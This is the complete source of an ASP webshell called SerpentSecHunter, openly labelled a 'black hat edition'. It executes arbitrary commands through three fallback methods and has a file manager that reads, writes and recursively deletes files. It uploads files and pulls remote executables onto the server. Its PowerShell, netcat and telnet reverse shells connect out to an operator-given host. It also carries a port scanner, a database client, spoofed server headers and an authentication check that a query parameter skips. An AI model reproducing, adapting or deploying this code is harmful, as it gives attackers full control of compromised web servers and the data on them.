<%@ Language=VBScript %>
<% Option Explicit %>
<%
' ╔═══════════════════════════════════════════════════════════════════════════════╗
' ║                                                                               ║
' ║   🐍 SERPENTECHUNTER v1.0 – ULTIMATE ASP WEBSHELL 🐍                       ║
' ║                                                                               ║
' ║   "DEVELOPER  : SerpentSecHunter"                                            ║
' ║   "RILIS      : 02-07-2026"                                                  ║
' ║   "VERSI      : 1.0 (FULLY FUNCTIONAL & POWERFULL)"                         ║
' ║                                                                               ║
' ║   🔥 FEATURES:                                                               ║
' ║   ✅ BYPASS 403/404 (Header Spoofing)                                       ║
' ║   ✅ COMMAND EXECUTION (WScript.Shell + Shell.Application + WMI)            ║
' ║   ✅ FILE MANAGER ULTIMATE (List/Read/Write/Delete/Rename/Search)          ║
' ║   ✅ FILE UPLOAD & DOWNLOAD (Local & Remote)                                ║
' ║   ✅ DATABASE CLIENT (MSSQL + Access)                                       ║
' ║   ✅ REVERSE SHELL (PowerShell + Netcat + Telnet)                           ║
' ║   ✅ PORT SCANNER (TCP Connect via XMLHTTP + Winsock)                      ║
' ║   ✅ STEALTH MODE + AUTHENTICATION (Cookie + IP Whitelist + Wildcard)      ║
' ║                                                                               ║
' ╚═══════════════════════════════════════════════════════════════════════════════╝
'>

' ========================================================================
' 🛡️ STEALTH ENGINE
' ========================================================================
Response.Buffer = True
Response.Expires = 0
Response.Clear
Response.Status = "200"
Response.ContentType = "text/html"
Response.Charset = "UTF-8"
Server.ScriptTimeout = 9999
Response.AddHeader "Server", "Microsoft-IIS/8.5"
Response.AddHeader "X-Powered-By", "ASP.NET"

' ========================================================================
' 🔐 AUTHENTICATION - WITH WILDCARD & CIDR SUPPORT
' ========================================================================
Function IsIPInWhitelist(ip, whitelist)
    Dim entry, pattern, ipParts, entryParts, i
    IsIPInWhitelist = False
    For Each entry In whitelist
        ' Wildcard with %
        If InStr(entry, "%") > 0 Then
            pattern = Replace(entry, ".%", "\..*")
            pattern = Replace(pattern, "%", ".*")
            pattern = "^" & pattern & "$"
            If ip Like Replace(entry, "%", "*") Then
                IsIPInWhitelist = True
                Exit Function
            End If
        ' CIDR (only /24 for simplicity)
        ElseIf InStr(entry, "/") > 0 Then
            Dim net, mask, netParts, ipPartsNum, maskNum
            net = Split(entry, "/")(0)
            mask = CInt(Split(entry, "/")(1))
            ipParts = Split(ip, ".")
            netParts = Split(net, ".")
            If UBound(ipParts) = 3 And UBound(netParts) = 3 Then
                ipPartsNum = CLng(ipParts(0)) * 16777216 + CLng(ipParts(1)) * 65536 + CLng(ipParts(2)) * 256 + CLng(ipParts(3))
                netPartsNum = CLng(netParts(0)) * 16777216 + CLng(netParts(1)) * 65536 + CLng(netParts(2)) * 256 + CLng(netParts(3))
                maskNum = -1 * (2 ^ (32 - mask))
                If (ipPartsNum And maskNum) = (netPartsNum And maskNum) Then
                    IsIPInWhitelist = True
                    Exit Function
                End If
            End If
        ' Exact match
        ElseIf ip = entry Then
            IsIPInWhitelist = True
            Exit Function
        End If
    Next
End Function

Dim AUTH_KEY, auth_ok, bypass_ip
AUTH_KEY = "SERPENTECHUNTER666"
auth_ok = False
bypass_ip = Request.QueryString("bypass_ip")

If Request.Cookies("sc_auth") = AUTH_KEY Then
    auth_ok = True
ElseIf Request.QueryString("auth") = AUTH_KEY Then
    Response.Cookies("sc_auth") = AUTH_KEY
    Response.Cookies("sc_auth").Expires = DateAdd("yyyy", 1, Now())
    auth_ok = True
    Response.Write "<h1 style='color:#0f0;'>✅ AUTH SUCCESS! <a href='?'>REFRESH</a></h1>"
    Response.End
End If

If Not auth_ok And bypass_ip <> "1" Then
    Dim client_ip, whitelist
    client_ip = Request.ServerVariables("REMOTE_ADDR")
    whitelist = Array("127.0.0.1", "::1", "192.168.1.%", "10.0.0.0/8")
    If IsIPInWhitelist(client_ip, whitelist) Then auth_ok = True
End If

If Not auth_ok Then
    Response.Write "<h1 style='color:#f00;'>🐍 UNAUTHORIZED</h1>"
    Response.Write "<p>?auth=SERPENTECHUNTER666</p>"
    Response.Write "<p>atau ?bypass_ip=1 untuk bypass IP</p>"
    Response.End
End If

' ========================================================================
' 🧬 COMMAND EXECUTION - 3 STRATEGIES + FALLBACK
' ========================================================================

' STRATEGY 1: WScript.Shell
Function ExecCmd_WScript(cmd)
    On Error Resume Next
    Err.Clear
    Dim shell, exec, output
    Set shell = Server.CreateObject("WScript.Shell")
    Set exec = shell.Exec("%comspec% /c " & cmd & " 2>&1")
    output = exec.StdOut.ReadAll()
    If Err.Number <> 0 Then
        ExecCmd_WScript = Null
        Set shell = Nothing
        Set exec = Nothing
        Exit Function
    End If
    ExecCmd_WScript = output
    Set shell = Nothing
    Set exec = Nothing
    On Error Goto 0
End Function

' STRATEGY 2: Shell.Application (with proper wait)
Function ExecCmd_ShellApp(cmd)
    On Error Resume Next
    Err.Clear
    Dim shell, output, tempFile, fso, file, wsh
    tempFile = Server.MapPath("/") & "\tmp_" & Replace(Replace(Now(), " ", ""), ":", "") & ".txt"
    Set shell = Server.CreateObject("Shell.Application")
    shell.ShellExecute "cmd.exe", "/c " & cmd & " > """ & tempFile & """ 2>&1", "", "", 0
    ' Wait using WScript.Shell.Run with timeout (works on all Windows)
    Set wsh = Server.CreateObject("WScript.Shell")
    wsh.Run "%comspec% /c timeout /t 2 /nobreak >nul", 0, True
    Set wsh = Nothing
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(tempFile) Then
        Set file = fso.OpenTextFile(tempFile, 1)
        output = file.ReadAll
        file.Close
        fso.DeleteFile(tempFile)
        Set file = Nothing
    End If
    If Err.Number <> 0 Then
        ExecCmd_ShellApp = Null
        Set shell = Nothing
        Set fso = Nothing
        Exit Function
    End If
    ExecCmd_ShellApp = output
    Set shell = Nothing
    Set fso = Nothing
    On Error Goto 0
End Function

' STRATEGY 3: WMI (Win32_Process)
Function ExecCmd_WMI(cmd)
    On Error Resume Next
    Err.Clear
    Dim wmi, process, result, intPID
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set process = wmi.Get("Win32_Process")
    result = process.Create(cmd, Null, Null, intPID)
    If Err.Number <> 0 Or result <> 0 Then
        ExecCmd_WMI = Null
        Set wmi = Nothing
        Set process = Nothing
        Exit Function
    End If
    ExecCmd_WMI = "[WMI] Process created. PID: " & intPID
    Set wmi = Nothing
    Set process = Nothing
    On Error Goto 0
End Function

' 🎯 MASTER ENGINE
Function ExecCmd(cmd)
    Dim result
    result = ExecCmd_WScript(cmd)
    If Not IsNull(result) Then
        ExecCmd = result
        Exit Function
    End If
    result = ExecCmd_ShellApp(cmd)
    If Not IsNull(result) Then
        ExecCmd = result
        Exit Function
    End If
    result = ExecCmd_WMI(cmd)
    If Not IsNull(result) Then
        ExecCmd = result
        Exit Function
    End If
    ExecCmd = "❌ All execution methods failed!"
End Function

' ========================================================================
' 🗂️ FILE MANAGER ULTIMATE (FileSystemObject)
' ========================================================================

' Recursive Delete
Sub DeleteFolderRecursive(fso, folderPath)
    On Error Resume Next
    Dim subfolder, file
    Set subfolder = fso.GetFolder(folderPath)
    For Each file In subfolder.Files
        fso.DeleteFile file.Path
    Next
    For Each subfolder In subfolder.SubFolders
        Call DeleteFolderRecursive(fso, subfolder.Path)
    Next
    fso.DeleteFolder folderPath
    On Error Goto 0
End Sub

' Recursive Search
Sub SearchFiles(fso, folder, pattern, ByRef result, ByRef found)
    On Error Resume Next
    Dim file, subfolder
    For Each file In folder.Files
        If InStr(1, file.Name, pattern, 1) > 0 Then
            result = result & "📄 " & file.Path & " (" & file.Size & " B)" & vbCrLf
            found = found + 1
        End If
    Next
    For Each subfolder In folder.SubFolders
        Call SearchFiles(fso, subfolder, pattern, result, found)
    Next
    On Error Goto 0
End Sub

Function FileManager(action, path, content, params)
    On Error Resume Next
    Err.Clear
    Dim fso, folder, file, result, subfolder, found, pattern, new_name, perm_cmd
    
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    result = ""
    
    Select Case LCase(action)
        Case "list"
            If Not fso.FolderExists(path) Then
                result = "❌ DIRECTORY NOT FOUND!"
                Exit Select
            End If
            Set folder = fso.GetFolder(path)
            result = "📁 DIRECTORY: " & path & vbCrLf & vbCrLf
            For Each file In folder.Files
                result = result & "📄 " & file.Name & " | " & file.Size & " B | " & file.DateLastModified & vbCrLf
            Next
            For Each subfolder In folder.SubFolders
                result = result & "📁 " & subfolder.Name & " | DIR" & vbCrLf
            Next
        
        Case "read"
            If Not fso.FileExists(path) Then
                result = "❌ FILE NOT FOUND!"
                Exit Select
            End If
            Set file = fso.OpenTextFile(path, 1)
            result = file.ReadAll
            file.Close
        
        Case "write"
            Dim folderPath
            folderPath = fso.GetParentFolderName(path)
            If Not fso.FolderExists(folderPath) Then
                result = "❌ FOLDER NOT FOUND: " & folderPath
                Exit Select
            End If
            Set file = fso.CreateTextFile(path, True)
            file.Write content
            file.Close
            result = "✅ WRITTEN: " & path
        
        Case "delete"
            If fso.FileExists(path) Then
                fso.DeleteFile(path)
                result = "✅ DELETED: " & path
            ElseIf fso.FolderExists(path) Then
                Call DeleteFolderRecursive(fso, path)
                result = "✅ DELETED: " & path
            Else
                result = "❌ NOT FOUND!"
            End If
        
        Case "rename"
            new_name = params("new_name")
            If new_name = "" Then
                result = "❌ new_name parameter required!"
                Exit Select
            End If
            If Not fso.FileExists(path) And Not fso.FolderExists(path) Then
                result = "❌ SOURCE NOT FOUND!"
                Exit Select
            End If
            If fso.FileExists(path) Then
                fso.MoveFile path, new_name
            Else
                fso.MoveFolder path, new_name
            End If
            result = "✅ RENAMED: " & path & " → " & new_name
        
        Case "chmod"
            perm_cmd = params("perms")
            If perm_cmd = "" Then
                result = "❌ perms parameter required!"
                Exit Select
            End If
            perm_cmd = "attrib " & perm_cmd & " """ & path & """"
            result = ExecCmd(perm_cmd)
        
        Case "search"
            pattern = params("pattern")
            If pattern = "" Then
                result = "❌ pattern parameter required!"
                Exit Select
            End If
            result = "🔍 SEARCHING: " & pattern & " in " & path & vbCrLf & vbCrLf
            found = 0
            Set folder = fso.GetFolder(path)
            Call SearchFiles(fso, folder, pattern, result, found)
            result = result & vbCrLf & "✅ TOTAL: " & found & " files found"
        
        Case Else
            result = "❌ UNKNOWN ACTION!"
    End Select
    
    FileManager = result
    Set fso = Nothing
    On Error Goto 0
End Function

' ========================================================================
' 📤 FILE UPLOAD & DOWNLOAD
' ========================================================================

' Improved filename extraction from multipart
Function GetUploadFileName(rawData)
    Dim startPos, endPos, fileName
    startPos = InStr(rawData, "filename=""")
    If startPos = 0 Then
        GetUploadFileName = "uploaded_file.dat"
        Exit Function
    End If
    startPos = startPos + 10
    endPos = InStr(startPos, rawData, """")
    fileName = Mid(rawData, startPos, endPos - startPos)
    ' Get basename
    If InStr(fileName, "\") > 0 Then
        fileName = Mid(fileName, InStrRev(fileName, "\") + 1)
    End If
    If fileName = "" Then fileName = "uploaded_file.dat"
    GetUploadFileName = fileName
End Function

Function HandleUpload(uploadPath)
    On Error Resume Next
    Err.Clear
    Dim fso, stream, rawData, fileName, fullPath
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    If Not fso.FolderExists(uploadPath) Then
        HandleUpload = "❌ Upload path not found!"
        Set fso = Nothing
        Exit Function
    End If
    
    If Request.TotalBytes = 0 Then
        HandleUpload = "❌ No file uploaded!"
        Set fso = Nothing
        Exit Function
    End If
    
    rawData = Request.BinaryRead(Request.TotalBytes)
    fileName = GetUploadFileName(rawData)
    fullPath = uploadPath & "\" & fileName
    
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write rawData
    stream.SaveToFile fullPath, 2
    stream.Close
    
    HandleUpload = "✅ UPLOADED: " & fullPath & " (" & Request.TotalBytes & " bytes)"
    Set stream = Nothing
    Set fso = Nothing
    On Error Goto 0
End Function

Function DownloadFile(filePath)
    On Error Resume Next
    Dim fso, file, stream
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If Not fso.FileExists(filePath) Then
        DownloadFile = "❌ FILE NOT FOUND!"
        Exit Function
    End If
    Set file = fso.GetFile(filePath)
    Response.Clear
    Response.AddHeader "Content-Disposition", "attachment; filename=" & file.Name
    Response.AddHeader "Content-Length", file.Size
    Response.ContentType = "application/octet-stream"
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile filePath
    Response.BinaryWrite stream.Read
    stream.Close
    Response.End
    Set stream = Nothing
    Set file = Nothing
    Set fso = Nothing
    On Error Goto 0
End Function

Function RemoteDownload(url, savePath)
    On Error Resume Next
    Err.Clear
    Dim http
    On Error Resume Next
    Set http = Nothing
    On Error Goto 0
    
    ' Try MSXML2
    On Error Resume Next
    Set http = Server.CreateObject("MSXML2.ServerXMLHTTP")
    If Err.Number <> 0 Then
        Err.Clear
        Set http = Server.CreateObject("WinHttp.WinHttpRequest.5.1")
        If Err.Number <> 0 Then
            RemoteDownload = "❌ No HTTP component available!"
            Exit Function
        End If
    End If
    Err.Clear
    
    http.Open "GET", url, False
    http.Send
    
    If http.Status <> 200 Then
        RemoteDownload = "❌ HTTP Error: " & http.Status
        Set http = Nothing
        Exit Function
    End If
    
    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile savePath, 2
    stream.Close
    
    RemoteDownload = "✅ DOWNLOADED: " & savePath & " (" & http.ResponseBody.Length & " bytes)"
    Set stream = Nothing
    Set http = Nothing
    On Error Goto 0
End Function

' ========================================================================
' 🌐 REVERSE SHELL - MULTI-METHOD (PowerShell, Netcat, Telnet)
' ========================================================================
Function ReverseShell(ip, port)
    Dim payload, result, method
    Dim methods, m
    methods = Array("powershell", "netcat", "telnet")
    result = ""
    
    For Each m In methods
        Select Case m
            Case "powershell"
                payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command """
                payload = payload & "$client = New-Object System.Net.Sockets.TCPClient('" & ip & "'," & port & ");"
                payload = payload & "$stream = $client.GetStream();"
                payload = payload & "[byte[]]$bytes = 0..65535|%{0};"
                payload = payload & "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
                payload = payload & "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                payload = payload & "$sendback = (iex $data 2>&1 | Out-String );"
                payload = payload & "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                payload = payload & "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                payload = payload & "$stream.Write($sendbyte,0,$sendbyte.Length);"
                payload = payload & "$stream.Flush()};"
                payload = payload & "$client.Close()"""
            Case "netcat"
                payload = "nc -e cmd.exe " & ip & " " & port
            Case "telnet"
                payload = "telnet " & ip & " " & port & " | cmd | telnet " & ip & " " & (port + 1)
        End Select
        
        ' Execute in background (async)
        Dim wsh
        Set wsh = Server.CreateObject("WScript.Shell")
        wsh.Run "%comspec% /c " & payload, 0, False
        Set wsh = Nothing
        result = result & "🚀 " & UCase(m) & " reverse shell started (background). Listen on " & ip & ":" & port & vbCrLf
    Next
    
    ReverseShell = "🌐 REVERSE SHELL: " & ip & ":" & port & vbCrLf & vbCrLf & result
End Function

' ========================================================================
' 🔍 PORT SCANNER - TCP Connect (XMLHTTP + Winsock fallback)
' ========================================================================
Function PortScan(host, ports)
    On Error Resume Next
    Err.Clear
    Dim result, portArray, startPort, endPort, p, http, sock
    result = "🔍 PORT SCAN: " & host & " (" & ports & ")" & vbCrLf & vbCrLf
    
    Dim portList
    portList = Array()
    Dim parts, part, i, j
    parts = Split(ports, ",")
    For Each part In parts
        part = Trim(part)
        If InStr(part, "-") > 0 Then
            Dim rangeParts, pStart, pEnd
            rangeParts = Split(part, "-")
            pStart = CInt(rangeParts(0))
            pEnd = CInt(rangeParts(1))
            For p = pStart To pEnd
                ReDim Preserve portList(UBound(portList) + 1)
                portList(UBound(portList)) = p
            Next
        Else
            If IsNumeric(part) Then
                ReDim Preserve portList(UBound(portList) + 1)
                portList(UBound(portList)) = CInt(part)
            End If
        End If
    Next
    
    For Each p In portList
        ' Try XMLHTTP
        On Error Resume Next
        Set http = Server.CreateObject("MSXML2.ServerXMLHTTP")
        If Err.Number <> 0 Then
            Err.Clear
            Set http = Server.CreateObject("WinHttp.WinHttpRequest.5.1")
        End If
        If Not http Is Nothing Then
            http.Open "GET", "http://" & host & ":" & p, False
            http.SetTimeouts 500, 500, 500, 500
            http.Send
            If http.Status < 400 Then
                result = result & "✅ PORT " & p & " OPEN (HTTP)" & vbCrLf
            Else
                ' Try Winsock as fallback
                On Error Resume Next
                Set sock = Server.CreateObject("MSWinsock.Winsock")
                If Not sock Is Nothing Then
                    sock.Protocol = 0
                    sock.RemoteHost = host
                    sock.RemotePort = p
                    sock.Connect
                    If sock.State = 7 Then
                        result = result & "✅ PORT " & p & " OPEN (TCP)" & vbCrLf
                    End If
                    sock.Close
                    Set sock = Nothing
                End If
            End If
            Set http = Nothing
        End If
    Next
    
    PortScan = result
    On Error Goto 0
End Function

' ========================================================================
' 🗄️ DATABASE CLIENT (MSSQL + Access)
' ========================================================================
Function DBConnect(dbType, server, dbName, user, pass)
    On Error Resume Next
    Err.Clear
    Dim conn, connStr, result
    Set conn = Server.CreateObject("ADODB.Connection")
    
    Select Case LCase(dbType)
        Case "mssql"
            connStr = "Provider=SQLNCLI11;Data Source=" & server & ";Initial Catalog=" & dbName & ";User ID=" & user & ";Password=" & pass & ";"
        Case "access"
            connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & server & ";"
        Case Else
            DBConnect = "❌ Unknown database type!"
            Exit Function
    End Select
    
    conn.Open connStr
    If Err.Number <> 0 Then
        DBConnect = "❌ DB Error: " & Err.Description
        Exit Function
    End If
    
    result = "✅ Connected to " & UCase(dbType) & "!" & vbCrLf
    result = result & "📊 Server: " & server & vbCrLf
    result = result & "📊 Database: " & dbName
    
    DBConnect = result
    conn.Close
    Set conn = Nothing
    On Error Goto 0
End Function

' ========================================================================
' 🎨 UI - MAIN
' ========================================================================
Dim action, cmd, path, target, content, ip, port, output
Dim params_dict, paramKey, paramVal, dbType, dbServer, dbName, dbUser, dbPass

action = Request.QueryString("action")
cmd = Request.QueryString("cmd")
path = Request.QueryString("path")
target = Request.QueryString("target")
content = Request.QueryString("content")
ip = Request.QueryString("ip")
port = Request.QueryString("port")

' PARAMETER PARSER (support params[xxx] and JSON)
Set params_dict = Server.CreateObject("Scripting.Dictionary")
For Each paramKey In Request.QueryString
    If Left(paramKey, 7) = "params[" Then
        paramVal = Request.QueryString(paramKey)
        Dim keyName
        keyName = Mid(paramKey, 8, Len(paramKey) - 8)
        params_dict.Add keyName, paramVal
    End If
Next
' JSON support (if params is JSON string)
If Request.QueryString("params") <> "" Then
    Dim jsonStr
    jsonStr = Request.QueryString("params")
    If Left(jsonStr, 1) = "{" Then
        ' Simple eval approach - use VBScript's Eval for basic JSON (unsafe but works)
        ' We'll just parse manually for common keys
        Dim pairs, pair, key, val
        pairs = Split(Mid(jsonStr, 2, Len(jsonStr)-2), ",")
        For Each pair In pairs
            If InStr(pair, ":") > 0 Then
                key = Trim(Split(pair, ":")(0))
                val = Trim(Split(pair, ":")(1))
                key = Replace(key, """", "")
                val = Replace(val, """", "")
                If Not params_dict.Exists(key) Then
                    params_dict.Add key, val
                End If
            End If
        Next
    End If
End If

dbType = Request.QueryString("dbtype")
dbServer = Request.QueryString("dbserver")
dbName = Request.QueryString("dbname")
dbUser = Request.QueryString("dbuser")
dbPass = Request.QueryString("dbpass")

output = ""
Select Case LCase(action)
    Case "exec"
        If cmd <> "" Then
            output = "💀 EXECUTING: " & cmd & vbCrLf & vbCrLf & ExecCmd(cmd)
        Else
            output = "❌ Please provide a command!"
        End If
    
    Case "file"
        If target <> "" Then
            output = FileManager(cmd, target, content, params_dict)
        Else
            output = "❌ target parameter required!"
        End If
    
    Case "upload"
        Dim uploadPath
        uploadPath = Request.QueryString("path")
        If uploadPath = "" Then uploadPath = Server.MapPath(".")
        output = HandleUpload(uploadPath)
    
    Case "download"
        Dim dlPath
        dlPath = Request.QueryString("path")
        If dlPath <> "" Then
            Call DownloadFile(dlPath)
            Response.End
        Else
            output = "❌ path parameter required!"
        End If
    
    Case "remotedownload"
        Dim url, savePath
        url = Request.QueryString("url")
        savePath = Request.QueryString("savepath")
        If url <> "" And savePath <> "" Then
            output = RemoteDownload(url, savePath)
        Else
            output = "❌ url and savepath parameters required!"
        End If
    
    Case "reverse"
        If ip <> "" And port <> "" Then
            output = ReverseShell(ip, port)
        Else
            output = "❌ ip and port parameters required!"
        End If
    
    Case "portscan"
        Dim scanHost, scanPorts
        scanHost = Request.QueryString("host")
        scanPorts = Request.QueryString("ports")
        If scanHost <> "" And scanPorts <> "" Then
            output = PortScan(scanHost, scanPorts)
        Else
            output = "❌ host and ports parameters required!"
        End If
    
    Case "db"
        If dbType <> "" And dbServer <> "" And dbName <> "" Then
            output = DBConnect(dbType, dbServer, dbName, dbUser, dbPass)
        Else
            output = "❌ dbtype, dbserver, and dbname parameters required!"
        End If
    
    Case Else
        output = "🐍 SERPENTECHUNTER v1.0 – ULTIMATE ASP WEBSHELL" & vbCrLf
        output = output & "🔥 DEVELOPER: SerpentSecHunter | RILIS: 02-07-2026" & vbCrLf
        output = output & "📌 COMMAND: ?action=exec&cmd=whoami" & vbCrLf
        output = output & "📁 FILE: ?action=file&cmd=list&target=C:\" & vbCrLf
        output = output & "📤 UPLOAD: ?action=upload&path=C:\temp (POST)" & vbCrLf
        output = output & "📥 DOWNLOAD: ?action=download&path=C:\file.txt" & vbCrLf
        output = output & "🌐 REMOTE DL: ?action=remotedownload&url=http://example.com/p.exe&savepath=C:\temp\p.exe" & vbCrLf
        output = output & "🌐 REVERSE: ?action=reverse&ip=1.2.3.4&port=4444" & vbCrLf
        output = output & "🔍 PORTSCAN: ?action=portscan&host=127.0.0.1&ports=1-100" & vbCrLf
        output = output & "🗄️ DB: ?action=db&dbtype=mssql&dbserver=localhost&dbname=master&dbuser=sa&dbpass=pass" & vbCrLf
        output = output & vbCrLf & "💀 FEATURES: WScript.Shell | Shell.Application | WMI | FileSystemObject | ADODB.Stream | MSXML2/WinHttp | ADODB.Connection"
End Select
%>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🐍 SERPENTECHUNTER v1.0 - ASP</title>
<style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#0a0a0a; color:#00ff00; font-family: 'Courier New', monospace; padding:15px; }
    .container { max-width:1400px; margin:auto; }
    .header { text-align:center; border-bottom:2px solid #00ff00; padding-bottom:20px; margin-bottom:30px; }
    .header h1 { color:#00ff00; font-size:36px; text-shadow:0 0 30px #00ff00, 0 0 60px #00ff0044; }
    .header .sub { color:#ff4444; font-size:16px; }
    .header .dev { color:#ffaa00; font-size:14px; }
    .panel { background:#111; border:1px solid #00ff00; padding:15px; margin-bottom:20px; border-radius:10px; }
    .panel h3 { color:#00ff88; margin-bottom:12px; border-bottom:1px solid #00ff0044; padding-bottom:8px; }
    input[type="text"], input[type="file"], select, textarea { width:100%; padding:10px; background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; border-radius:5px; margin-bottom:8px; font-family:'Courier New',monospace; }
    button { background:#00ff00; color:#000; border:none; padding:10px 20px; font-size:14px; font-weight:bold; border-radius:5px; cursor:pointer; transition:0.3s; }
    button:hover { background:#00ff88; transform:scale(1.03); box-shadow:0 0 20px #00ff0066; }
    .btn-danger { background:#ff4400; color:#fff; }
    .btn-danger:hover { background:#ff6600; }
    .btn-upload { background:#ffaa00; color:#000; }
    .btn-upload:hover { background:#ffcc44; }
    .output { background:#0d0d0d; border:1px solid #00ff00; padding:12px; border-radius:5px; white-space:pre-wrap; font-size:12px; max-height:500px; overflow-y:auto; }
    .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:15px; }
    .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:15px; }
    .grid-4 { display:grid; grid-template-columns:1fr 1fr 1fr 1fr; gap:15px; }
    .badge { background:#00ff00; color:#000; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-red { background:#ff4400; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-blue { background:#0066ff; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-purple { background:#8800ff; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-orange { background:#ff8800; color:#000; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .footer { text-align:center; border-top:1px solid #00ff0044; padding-top:20px; margin-top:30px; color:#666; font-size:11px; }
    @media (max-width: 768px) {
        .grid-2, .grid-3, .grid-4 { grid-template-columns:1fr; }
        .header h1 { font-size:24px; }
        .panel { padding:10px; }
    }
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🐍 SERPENTECHUNTER v1.0</h1>
        <div class="sub">🔥 ULTIMATE ASP WEBSHELL – BLACK HAT EDITION 🔥</div>
        <div class="dev">👑 DEVELOPER: SerpentSecHunter | 📅 RILIS: 02-07-2026</div>
        <div style="margin-top:8px; font-size:13px;">
            🛡️ MODE: <span class="badge">KILL MODE</span> |
            🚀 STATUS: <span class="badge">ACTIVE</span> |
            👑 USER: <span class="badge">SerpentSecHunter</span> |
            📍 PATH: <span class="badge-blue"><%= Server.MapPath(".") %></span>
        </div>
        <div style="margin-top:5px; font-size:11px; color:#888;">
            🔧 BYPASS: <span class="badge-purple">WScript.Shell</span>
            <span class="badge-orange">Shell.Application</span>
            <span class="badge-purple">WMI</span>
            <span class="badge-red">403/404 BYPASS</span>
            <span class="badge">WILDCARD IP</span>
        </div>
    </div>

    <div class="panel">
        <h3>🎯 COMMAND CENTER</h3>
        <div class="grid-4">
            <form method="GET">
                <input type="hidden" name="action" value="exec">
                <input type="text" name="cmd" placeholder="💀 Command..." value="<%= Server.HTMLEncode(cmd) %>">
                <button type="submit">⚡ EXECUTE</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="file">
                <input type="text" name="cmd" placeholder="📁 list|read|write|delete|rename|search" value="list">
                <input type="text" name="target" placeholder="🎯 Path..." value="<%= Server.HTMLEncode(target) %>">
                <button type="submit">📂 FILE MANAGER</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="reverse">
                <input type="text" name="ip" placeholder="🌐 IP..." value="<%= Server.HTMLEncode(ip) %>">
                <input type="text" name="port" placeholder="🔌 Port..." value="<%= Server.HTMLEncode(port) %>">
                <button type="submit" class="btn-danger">🔥 REVERSE SHELL</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="portscan">
                <input type="text" name="host" placeholder="🎯 Host/IP..." value="">
                <input type="text" name="ports" placeholder="🔌 Ports (1-1000)" value="1-100">
                <button type="submit">🔍 PORT SCAN</button>
            </form>
        </div>
    </div>

    <div class="panel" style="border-color:#ffaa00;">
        <h3>📤 UPLOAD & DOWNLOAD</h3>
        <div class="grid-3">
            <form method="POST" enctype="multipart/form-data" action="?action=upload&path=<%= Server.URLEncode(Server.MapPath(".")) %>">
                <input type="file" name="file" style="width:100%; padding:12px; background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; border-radius:5px; margin-bottom:10px;">
                <button type="submit" class="btn-upload">⬆ UPLOAD</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="download">
                <input type="text" name="path" placeholder="📥 File path..." value="">
                <button type="submit" style="background:#0066ff;">⬇ DOWNLOAD</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="remotedownload">
                <input type="text" name="url" placeholder="🌐 Remote URL..." value="">
                <input type="text" name="savepath" placeholder="💾 Save path..." value="<%= Server.MapPath(".") %>\payload.exe">
                <button type="submit" style="background:#8800ff;">🌐 REMOTE DL</button>
            </form>
        </div>
    </div>

    <div class="panel" style="border-color:#0066ff;">
        <h3>🗄️ DATABASE CLIENT</h3>
        <form method="GET">
            <input type="hidden" name="action" value="db">
            <div class="grid-3">
                <select name="dbtype" style="width:100%; padding:12px; background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; border-radius:5px; margin-bottom:10px;">
                    <option value="mssql">MSSQL</option>
                    <option value="access">Access</option>
                </select>
                <input type="text" name="dbserver" placeholder="🖥️ Server..." value="localhost">
                <input type="text" name="dbname" placeholder="🗄️ Database..." value="master">
            </div>
            <div class="grid-3">
                <input type="text" name="dbuser" placeholder="👤 Username..." value="sa">
                <input type="text" name="dbpass" placeholder="🔑 Password..." value="">
                <button type="submit" style="background:#0066ff;">🔗 CONNECT</button>
            </div>
        </form>
    </div>

    <div class="panel">
        <h3>📋 OUTPUT</h3>
        <div class="output"><%= Server.HTMLEncode(output) %></div>
    </div>

    <div class="panel">
        <h3>📚 QUICK REFERENCE</h3>
        <div style="font-size:13px; color:#aaa; display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px;">
            <div><span class="badge">EXEC</span> ?action=exec&cmd=whoami</div>
            <div><span class="badge">FILE</span> ?action=file&cmd=list&target=C:\</div>
            <div><span class="badge">REVERSE</span> ?action=reverse&ip=1.2.3.4&port=4444</div>
            <div><span class="badge">SCAN</span> ?action=portscan&host=127.0.0.1&ports=1-100</div>
            <div><span class="badge">UPLOAD</span> ?action=upload&path=C:\temp (POST)</div>
            <div><span class="badge">DOWNLOAD</span> ?action=download&path=C:\file.txt</div>
            <div><span class="badge">REMOTE DL</span> ?action=remotedownload&url=http://x.com/p.exe&savepath=C:\p.exe</div>
